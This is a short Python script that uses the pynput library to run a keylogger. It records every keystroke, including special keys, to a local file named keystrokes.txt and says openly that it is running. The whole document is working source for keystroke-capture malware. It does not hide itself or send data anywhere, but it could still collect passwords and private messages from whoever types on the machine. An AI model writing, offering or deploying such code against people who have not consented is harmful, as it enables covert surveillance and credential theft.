from pynput.keyboard import Listener

# This is the name of the file where we’ll save the keys
log_file = "keystrokes.txt"

# This function runs every time a key is pressed
def on_key_press(key):
    try:
        # Try to get the character of the key
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        # If it's a special key (like Shift or Enter), write its name instead
        with open(log_file, "a") as file:
            file.write(f" [{key}] ")

# Start listening to the keyboard
with Listener(on_press=on_key_press) as listener:
    print("Keylogger is running... (press Ctrl+C to stop)")
    listener.join()
